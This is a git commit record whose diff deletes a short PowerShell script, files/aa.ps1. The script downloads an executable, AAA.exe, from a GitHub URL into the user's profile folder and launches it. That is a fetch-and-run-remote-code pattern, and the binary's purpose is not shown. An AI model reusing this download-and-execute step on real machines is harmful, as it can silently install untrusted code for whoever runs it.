96c183f089f062f21524e902cd40910097d2c66e
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-11 21:39:13 +0300

    Delete files/aa.ps1

--- files/aa.ps1
+++
@@ -1,8 +0,0 @@
-$destinationPath = "$env:USERPROFILE\AAA.exe"
-$url = "https://github.com/webntdev/webntdev.github.io/raw/main/AAA/AAA.exe"
-
-if (-Not (Test-Path $destinationPath)) {
-    Invoke-WebRequest -Uri $url -OutFile $destinationPath
-}
-
-Start-Process $destinationPath
